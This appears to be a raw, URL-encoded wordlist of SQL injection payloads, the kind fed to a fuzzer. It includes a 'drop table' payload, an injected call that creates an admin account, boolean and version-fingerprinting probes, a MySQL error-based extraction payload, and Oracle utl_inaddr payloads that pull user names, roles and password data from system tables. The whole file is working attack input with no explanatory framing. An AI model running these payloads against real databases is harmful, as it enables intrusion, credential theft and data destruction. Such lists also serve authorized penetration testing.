'%20;%20drop%20table%20temp%20--
'%20||%20myappadmin.adduser('admin',%20'newpass')%20||%20'
%20AND%20(SELECT%204523%20FROM(SELECT%20COUNT(*),CONCAT(0x716a7a6a71,(SELECT%20(ELT(4523%3D4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)
%20and%20(select%20substring(@@version,1,1))%3D'M'
%20and%20(select%20substring(@@version,1,1))%3D'X'
%20and%20(select%20substring(@@version,2,1))%3D'i'
%20and%20(select%20substring(@@version,2,1))%3D'y'
%20and%20(select%20substring(@@version,3,1))%3D'c'
%20and%20(select%20substring(@@version,3,1))%3D'S'
%20and%20(select%20substring(@@version,3,1))%3D'X'
%20AND%201%3D0
%20AND%201%3D0--%20
%20AND%201%3D0%20AND%20'%'%3D'
%20AND%201%3D0%23
%20AND%201%3D1
%20AND%201%3D1--%20
%20AND%201%3D1%20AND%20'%'%3D'
%20AND%201%3D1%23
'%20AND%201%3Dutl_inaddr.get_host_address((SELECT%20banner%20FROM%20v$version%20WHERE%20ROWNUM%3D1))%20AND%20'i'%3D'i
'%20AND%201%3Dutl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(column_name))%20FROM%20sys.all_tab_columns))%20AND%20'i'%3D'i
'%20AND%201%3Dutl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(GRANTED_ROLE))%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DSYS.LOGIN_USER))%20AND%20'i'%3D'i
'%20AND%201%3Dutl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(PASSWORD))%20FROM%20SYS.USER$))%20AND%20'i'%3D'i
'%20AND%201%3Dutl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(table_name))%20FROM%20sys.all_tables))%20AND%20'i'%3D'i
'%20AND%201%3Dutl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(USERNAME))%20FROM%20SYS.ALL_USERS))%20AND%20'i'%3D'i
